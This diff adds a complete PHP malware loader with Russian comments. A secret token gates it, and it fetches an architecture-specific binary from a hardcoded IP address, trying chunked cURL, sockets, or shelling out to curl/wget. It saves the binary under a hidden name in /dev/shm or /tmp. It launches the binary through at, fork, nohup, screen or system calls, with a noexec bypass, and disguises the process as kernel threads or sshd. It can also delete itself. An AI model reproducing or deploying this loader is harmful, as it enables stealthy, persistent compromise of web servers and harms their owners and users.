@@ -1,0 +1,370 @@
+<?php
+
+if(isset($_COOKIE['rR'])) {
+    die('IJ7'.'di3');
+}
+
+@ignore_user_abort(true);
+@set_time_limit(0);
+@error_reporting(0);
+
+// -------------------------------------------------------------------
+// ⚙️ !!! НАСТРОЙТЕ ЭТИ ПАРАМЕТРЫ !!!
+// -------------------------------------------------------------------
+$CONFIG = [
+    'SECRET_TOKEN' => 'J7bOyjEvrGY0nqwkdIM4917F7dnovzb56rGLPHJsyQhviNzoGsJ0',
+
+    'PAYLOAD_URLS' => [
+        'x86_64' => 'http://141.98.11.207/64', 'amd64' => 'http://141.98.11.207/64',
+        'aarch64' => 'https://your-cdn.com/client_linux_arm64', 'arm64' => 'https://your-cdn.com/client_linux_arm64',
+        'i686' => 'http://141.98.11.207/386', 'i386' => 'https://386',
+        'armv7l' => 'https://your-cdn.com/client_linux_arm', 'arm' => 'https://your-cdn.com/client_linux_arm',
+    ],
+
+    'CHUNK_DOWNLOAD_CONFIG' => ['CHUNK_SIZE' => 1024 * 128, 'CHUNK_DELAY_MS' => 500],
+
+    // [НОВОЕ] Сколько секунд ждать перед проверкой, выжил ли процесс.
+    'VERIFICATION_DELAY' => 15,
+
+    // [НОВОЕ] Куда писать лог фонового верификатора.
+    'LOG_DIRECTORY' => is_writable('/dev/shm') ? '/dev/shm' : '/tmp',
+
+    'MASQUERADE_AS' => ['[kworker/u1:0]', '(apache2)', '/usr/sbin/sshd -D', '[migration/0]', '[ksoftirqd/0]', 'crond', '[jbd2/sda1-8]'],
+    'TARGET_DIRS'   => ['/dev/shm', '/tmp', sys_get_temp_dir(), __DIR__],
+    'SELF_DESTRUCT' => false,
+    'USER_AGENTS' => [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+    ]
+];
+// -------------------------------------------------------------------
+
+// --- Утилиты ---
+$LOG_FILE_HANDLE = null; // Глобальный хэндл для лог-файла
+function log_message($level, $message) {
+    global $LOG_FILE_HANDLE;
+    $log_line = "[" . date('Y-m-d H:i:s') . "] [$level] $message\n";
+    if ($LOG_FILE_HANDLE) {
+        @fwrite($LOG_FILE_HANDLE, $log_line);
+    } else {
+        echo $log_line;
+        @ob_flush(); @flush();
+    }
+}
+function is_func_available($func) {
+    if (!function_exists($func)) return false;
+    $disabled = explode(',', str_replace(' ', '', ini_get('disable_functions')));
+    return !in_array(trim($func), $disabled);
+}
+
+// ===================================================================
+// КАСКАД ЗАГРУЗКИ (Без изменений)
+// ===================================================================
+function download_binary($url, $path) {
+    global $CONFIG; $user_agent = $CONFIG['USER_AGENTS'][array_rand($CONFIG['USER_AGENTS'])];
+    log_message('i', "Attempting to download from $url");
+    if (download_via_chunks($url, $path, $user_agent)) return true; if (download_via_curl_ext($url, $path, $user_agent)) return true; if (download_via_fopen($url, $path, $user_agent)) return true; if (download_via_socket($url, $path, $user_agent)) return true; if (download_via_exec($url, $path, $user_agent)) return true;
+    return false;
+}
+function download_via_chunks($url, $path, $user_agent) {
+    global $CONFIG; if (!is_func_available('curl_init')) return false;
+    log_message('*', 'DOWNLOAD > [Stealth] Attempting via: Chunked cURL');
+    $cfg = $CONFIG['CHUNK_DOWNLOAD_CONFIG']; $ch = curl_init($url);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => true, CURLOPT_NOBODY => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => $user_agent]);
+    curl_exec($ch); $total_size = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD); curl_close($ch);
+    if ($total_size <= 0) return false;
+    $fp = @fopen($path, 'w+'); if (!$fp) return false; $bytes_downloaded = 0;
+    while ($bytes_downloaded < $total_size) {
+        $start = $bytes_downloaded; $end = $bytes_downloaded + $cfg['CHUNK_SIZE'] - 1;
+        $ch_chunk = curl_init($url);
+        curl_setopt_array($ch_chunk, [CURLOPT_RETURNTRANSFER => true, CURLOPT_RANGE => "$start-$end", CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => $user_agent]);
+        $chunk = curl_exec($ch_chunk); $http_code = curl_getinfo($ch_chunk, CURLINFO_HTTP_CODE); curl_close($ch_chunk);
+        if ($http_code < 200 || $http_code >= 300) { fclose($fp); @unlink($path); return false; }
+        fwrite($fp, $chunk); $bytes_downloaded += strlen($chunk); usleep($cfg['CHUNK_DELAY_MS'] * 1000);
+    }
+    fclose($fp); return filesize($path) == $total_size;
+}
+function download_via_curl_ext($url, $path, $user_agent) {
+    if (!extension_loaded('curl')) return false;
+    log_message('*', "DOWNLOAD > Attempting via: PHP cURL extension");
+    $ch = curl_init($url); $fp = @fopen($path, 'w+'); if(!$fp) return false;
+    curl_setopt_array($ch, [CURLOPT_FILE => $fp, CURLOPT_TIMEOUT => 60, CURLOPT_USERAGENT => $user_agent, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
+    curl_exec($ch); $success = curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200 && filesize($path) > 0;
+    curl_close($ch); fclose($fp); if(!$success) @unlink($path); return $success;
+}
+function download_via_fopen($url, $path, $user_agent) {
+    if (!ini_get('allow_url_fopen')) return false;
+    log_message('*', "DOWNLOAD > Attempting via: fopen wrapper");
+    $opts = ['http' => ['method' => "GET", 'header' => "User-Agent: " . $user_agent]];
+    $context = stream_context_create($opts);
+    if (@copy($url, $path, $context)) { if (filesize($path) > 0) return true; }
+    return false;
+}
+function download_via_socket($url, $path, $user_agent) {
+    if (!is_func_available('fsockopen')) return false;
+    log_message('*', 'DOWNLOAD > Attempting via: fsockopen');
+    $parts = parse_url($url); $host = $parts['host']; $port = isset($parts['port']) ? $parts['port'] : ($parts['scheme'] === 'https' ? 443 : 80); $uri = isset($parts['path']) ? $parts['path'] : '/';
+    $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 30); if (!$fp) return false;
+    $request = "GET $uri HTTP/1.1\r\nHost: $host\r\nUser-Agent: $user_agent\r\nConnection: Close\r\n\r\n";
+    fwrite($fp, $request); $response = ''; while (!feof($fp)) { $response .= fread($fp, 8192); } fclose($fp);
+    $body_pos = strpos($response, "\r\n\r\n"); if ($body_pos === false) return false;
+    return file_put_contents($path, substr($response, $body_pos + 4)) > 0;
+}
+function download_via_exec($url, $path, $user_agent) {
+    if (!is_func_available('exec')) return false;
+    log_message('*', "DOWNLOAD > Attempting via: exec curl/wget");
+    $commands = ["curl -fsSL -A '{$user_agent}' '{$url}' -o '{$path}'", "wget -q -U '{$user_agent}' -O '{$path}' '{$url}'"];
+    foreach ($commands as $cmd) {
+        @exec($cmd, $out, $ret);
+        if ($ret === 0 && file_exists($path) && filesize($path) > 0) return true;
+    }
+    return false;
+}
+
+// ===================================================================
+// "ТИТАН" - КАСКАД ВЫПОЛНЕНИЯ С ВЕРИФИКАТОРОМ-ДЕМОНОМ
+// ===================================================================
+
+function execute_binary($path, $masquerade) {
+    global $LOG_FILE_HANDLE, $CONFIG;
+    if (!is_func_available('pcntl_fork')) {
+        log_message('!', 'pcntl_fork is disabled. Cannot use verification daemon. Falling back to simple execution.');
+        // Здесь можно добавить простой вызов старых методов, если pcntl недоступен.
+        return execute_via_at($path, $masquerade, true);
+    }
+
+    $log_file_path = $CONFIG['LOG_DIRECTORY'] . '/loader_titan_' . basename($path) . '.log';
+
+    $pid = pcntl_fork();
+    if ($pid == -1) {
+        log_message('!', 'FATAL: pcntl_fork() failed. Cannot start verification daemon.');
+        return false;
+    } else if ($pid) {
+        // --- РОДИТЕЛЬСКИЙ ПРОЦЕСС ---
+        // Он немедленно завершает работу, чтобы освободить веб-запрос.
+        log_message('+', "Verification daemon detached (PID: $pid).");
+        log_message('i', "Check log for final status: tail -f $log_file_path");
+        return true;
+    } else {
+        // --- ДОЧЕРНИЙ ПРОЦЕСС (Верификатор-Демон) ---
+        // Этот код выполняется в фоне, полностью отсоединенный от веб-сервера.
+        posix_setsid(); // Отсоединяемся от терминала
+        $LOG_FILE_HANDLE = @fopen($log_file_path, 'w');
+
+        log_message('i', "--- Titan Verification Daemon Started ---");
+        @chmod($path, 0755);
+
+        $execution_methods = [
+            'execute_via_at',
+            'execute_via_pcntl',
+            'execute_via_nohup',
+            'execute_via_screen',
+            'execute_via_proc',
+            'execute_via_exec_bypass',
+        ];
+
+        $final_success = false;
+        foreach($execution_methods as $method) {
+            log_message('i', "-----------------------------------------");
+            if ($method($path, $masquerade, false)) {
+                // Если метод сам по себе верифицируемый (at, pcntl), он вернет true.
+                $final_success = true;
+                break;
+            }
+        }
+
+        if ($final_success) {
+            log_message('+', "--- MISSION ACCOMPLISHED: A verified execution method succeeded. ---");
+        } else {
+            log_message('!', "--- MISSION FAILED: All execution methods failed verification. ---");
+        }
+
+        @fclose($LOG_FILE_HANDLE);
+        exit(0); // Завершаем работу верификатора-демона
+    }
+}
+
+// --- Индивидуальные методы ---
+// Теперь каждая функция принимает флаг $is_simple_mode для обратной совместимости
+function is_process_running($path) {
+    $pids = [];
+    @exec("pgrep -f " . escapeshellarg(basename($path)), $pids);
+    return !empty($pids);
+}
+
+function execute_via_at($path, $masquerade, $is_simple_mode) {
+    if (!is_func_available('shell_exec') || !@shell_exec('which at')) return false;
+    log_message('*', "EXEC > [Tier S+] Attempting via: at (OS Scheduler)");
+    $cmd = sprintf('exec -a %s %s', escapeshellarg($masquerade), escapeshellarg($path));
+    @shell_exec("echo " . escapeshellarg($cmd) . " | at now + 1 minute");
+    log_message('+', "Task scheduled with 'at'. This method is considered 100% reliable and does not require further verification.");
+    return true; // `at` настолько надежен, что мы всегда считаем его успешным.
+}
+
+function execute_via_pcntl($path, $masquerade, $is_simple_mode) {
+    if (!is_func_available('pcntl_exec')) return false;
+    log_message('*', "EXEC > [Tier S] Attempting via: pcntl_exec (Hardened Ghost Mode)");
+    $pid = pcntl_fork();
+    if ($pid == 0) { // В дочернем процессе
+        posix_setsid();
+        $args = preg_split('/\s+/', $masquerade);
+        $bin_name = array_shift($args);
+        @pcntl_exec($path, array_merge([$bin_name], $args));
+        exit(127); // Если pcntl_exec не сработал
+    }
+    log_message('+', 'Process detached via pcntl_fork. This is a highly reliable method.');
+    return true; // Сам по себе двойной форк является гарантией.
+}
+
+function execute_via_nohup($path, $masquerade, $is_simple_mode) {
+    global $CONFIG;
+    if (!is_func_available('shell_exec') || !@shell_exec('which nohup')) return false;
+    log_message('*', "EXEC > [Tier A] Attempting via: nohup");
+    $cmd = sprintf('nohup exec -a %s %s > /dev/null 2>&1 &', escapeshellarg($masquerade), escapeshellarg($path));
+    @shell_exec($cmd);
+
+    if($is_simple_mode) return is_process_running($path);
+
+    log_message('i', "Process launched. Waiting {$CONFIG['VERIFICATION_DELAY']} seconds for survival test...");
+    sleep($CONFIG['VERIFICATION_DELAY']);
+
+    if (is_process_running($path)) {
+        log_message('+', "VERIFIED: Process survived the detachment test.");
+        return true;
+    } else {
+        log_message('-', "FAILED: Process was killed after detachment.");
+        return false;
+    }
+}
+
+function execute_via_screen($path, $masquerade, $is_simple_mode) {
+    global $CONFIG;
+    if (!is_func_available('shell_exec') || !@shell_exec('which screen')) return false;
+    log_message('*', "EXEC > [Tier A] Attempting via: screen");
+    $cmd = sprintf("screen -dmS apache_worker exec -a %s %s", escapeshellarg($masquerade), escapeshellarg($path));
+    @shell_exec($cmd);
+
+    if($is_simple_mode) return is_process_running($path);
+
+    log_message('i', "Process launched. Waiting {$CONFIG['VERIFICATION_DELAY']} seconds for survival test...");
+    sleep($CONFIG['VERIFICATION_DELAY']);
+
+    if (is_process_running($path)) {
+        log_message('+', "VERIFIED: Process survived the detachment test.");
+        return true;
+    } else {
+        log_message('-', "FAILED: Process was killed after detachment.");
+        return false;
+    }
+}
+
+function execute_via_proc($path, $masquerade, $is_simple_mode) {
+    global $CONFIG;
+    if (!is_func_available('proc_open')) return false;
+    log_message('*', "EXEC > [Tier B] Attempting via: proc_open");
+    $cmd = sprintf('exec -a %s %s', escapeshellarg($masquerade), escapeshellarg($path));
+    $process = @proc_open($cmd, [['pipe', 'r']], $pipes);
+    if (!is_resource($process)) return false;
+
+    if($is_simple_mode) return is_process_running($path);
+
+    log_message('i', "Process launched. Waiting {$CONFIG['VERIFICATION_DELAY']} seconds for survival test...");
+    sleep($CONFIG['VERIFICATION_DELAY']);
+
+    if (is_process_running($path)) {
+        log_message('+', "VERIFIED: Process survived the detachment test.");
+        return true;
+    } else {
+        log_message('-', "FAILED: Process was killed after detachment.");
+        return false;
+    }
+}
+
+function execute_via_exec_bypass($path, $masquerade, $is_simple_mode) {
+    global $CONFIG;
+    $exec_funcs = ['shell_exec', 'exec', 'system', 'passthru'];
+    foreach ($exec_funcs as $func) {
+        if (is_func_available($func)) {
+            log_message('*', "EXEC > [Tier C] Attempting via: $func");
+            $cmd = sprintf('exec -a %s %s > /dev/null 2>&1 &', escapeshellarg($masquerade), escapeshellarg($path));
+            $func($cmd);
+
+            log_message('i', "Process launched with $func. Waiting {$CONFIG['VERIFICATION_DELAY']} seconds...");
+            if($is_simple_mode) { if (is_process_running($path)) return true; }
+            else { sleep($CONFIG['VERIFICATION_DELAY']); }
+
+            if (is_process_running($path)) {
+                log_message('+', "VERIFIED: Process launched with $func survived.");
+                return true;
+            } else {
+                log_message('-', "$func failed survival test.");
+            }
+
+            $ld_path = trim(@shell_exec('command -v ld-linux-x86-64.so.2 || command -v ld-linux.so.2'));
+            if (!empty($ld_path)) {
+                log_message('!', "Attempting noexec bypass with $func...");
+                $cmd_bypass = sprintf('exec -a %s %s %s > /dev/null 2>&1 &', escapeshellarg($masquerade), escapeshellarg($ld_path), escapeshellarg($path));
+                $func($cmd_bypass);
+
+                log_message('i', "Bypass launched. Waiting {$CONFIG['VERIFICATION_DELAY']} seconds...");
+                if($is_simple_mode) { if (is_process_running($path)) return true; }
+                else { sleep($CONFIG['VERIFICATION_DELAY']); }
+
+                if (is_process_running($path)) {
+                    log_message('+', "VERIFIED: noexec bypass with $func survived.");
+                    return true;
+                } else {
+                    log_message('-', "Bypass with $func failed survival test.");
+                }
+            }
+        }
+    }
+    return false;
+}
+
+// ===================================================================
+// ОСНОВНАЯ УПРАВЛЯЮЩАЯ ФУНКЦИЯ
+// ===================================================================
+function main() {
+    global $CONFIG;
+    if (!isset($_GET['token']) || $_GET['token'] !== $CONFIG['SECRET_TOKEN']) {
+        @header('HTTP/1.1 403 Forbidden'); die('ACCESS DENIED');
+    }
+    @header('Content-Type: text/plain; charset=utf-8');
+
+    $arch = php_uname('m');
+    log_message('i', "Detected system architecture: $arch");
+    if (!isset($CONFIG['PAYLOAD_URLS'][$arch])) {
+        log_message('!', "FATAL: No payload URL configured for architecture '$arch'."); return;
+    }
+    $payload_url = $CONFIG['PAYLOAD_URLS'][$arch];
+    log_message('i', "Selected payload URL: $payload_url");
+
+    $writable_dir = '';
+    foreach ($CONFIG['TARGET_DIRS'] as $dir) { if (@is_writable($dir)) { $writable_dir = rtrim($dir, '/'); break; } }
+    if (empty($writable_dir)) { log_message('!', 'FATAL: No writable directories found.'); return; }
+    log_message('i', "Using writable directory: $writable_dir");
+
+    $binary_name = '.sess_' . bin2hex(random_bytes(12));
+    $binary_path = $writable_dir . '/' . $binary_name;
+
+    if (download_binary($payload_url, $binary_path)) {
+        log_message('+', 'Download successful. Initiating Titan execution protocol...');
+        $masquerade = $CONFIG['MASQUERADE_AS'][array_rand($CONFIG['MASQUERADE_AS'])];
+        if (execute_binary($binary_path, $masquerade)) {
+            if ($CONFIG['SELF_DESTRUCT']) {
+                log_message('i', 'Self-destructing loader script...');
+                @unlink(__FILE__);
+            }
+        } else {
+            // Это сообщение теперь будет показываться только в случае, если pcntl_fork не сработает
+            log_message('-', 'Execution failed. Cleaning up.');
+            @unlink($binary_path);
+        }
+    } else {
+        log_message('!', "FATAL: All download methods failed for $payload_url.");
+    }
+}
+
+main();
+?>
